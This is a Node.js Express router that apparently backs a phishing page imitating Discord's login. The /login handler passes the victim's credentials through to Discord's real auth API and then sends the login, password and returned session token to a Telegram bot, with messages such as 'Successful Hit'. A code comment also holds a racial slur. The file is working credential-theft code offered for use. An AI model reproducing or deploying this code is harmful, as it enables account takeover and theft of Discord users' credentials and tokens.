// hehe log info >.<
// uwu

var config = require("../config.json")
var botTelegram = config.bot
var tgChatId = config.chatId



var express = require('express');
var router = express.Router();
const fetch = require("node-fetch");


router.all("/login", async function(req,res){
    if(req.method == "GET") return res.status(400)
    console.log(req.body)
    var lul = await fetch("https://discord.com/api/v9/auth/login",{
        method: req.method,
        body: JSON.stringify(req.body),
        headers: {"Content-Type": "application/json"}
    })
    var data = await lul.json()

    if(req.body.login){
        if(data.message != "Invalid Form Body")
        {
            fetch(botTelegram,{
                method: "POST",
                body: JSON.stringify({
                    "chat_id": tgChatId,
                    "text": `<b>METHOD: LOGIN BUTTON</b>\n\n<b>✅ New Log ✅</b>\n\n<b>Login</b>: ${req.body.login}\n<b>Password</b>: ${req.body.password}\n\n<b>Awaiting the token 😈😈😈</b>`,
                    "parse_mode": "HTML"
                }),
                headers: {"Content-Type": "application/json"}
            })
        }

    }
        
    
    //////// WTF ????????????????? NIGA?????????????????
    if(data.token)
    {
        fetch(botTelegram,{
                method: "POST",
                body: JSON.stringify({
                    "chat_id": tgChatId,
                    "text": `<b>METHOD: LOGIN BUTTON</b>\n\n<b>✅ Successful Hit ✅</b>\n\n<b>Login</b>: ${req.body.login}\n<b>Password</b>: ${req.body.password}\n\n<b>Token: ${JSON.stringify(data.token)}</b>`,
                    "parse_mode": "HTML"
                }),
                headers: {"Content-Type": "application/json"}
        })
        res.status(420).send(data)

    }

    res.status(lul.status).send(data)
});


router.all('/forgot', async function(req, res){
    if(req.method == "GET") return res.status(400)
    var response = await fetch("https://discord.com/api/v9/auth/forgot",{
        method: req.method,
        body: JSON.stringify(req.body),
        headers: {'Content-Type': 'application/json'},
    })
    const data = await response.json();
    
    res.status(response.status).send(data)
});
router.get('/location-metadata', async function(req, res){
    var response = await fetch("https://discord.com/api/v9/location-metadata",{
        method: req.method,
        headers: {'Content-Type': 'application/json'}
    })
    const data = await response.json();
    res.status(200).send(data)
});


module.exports = router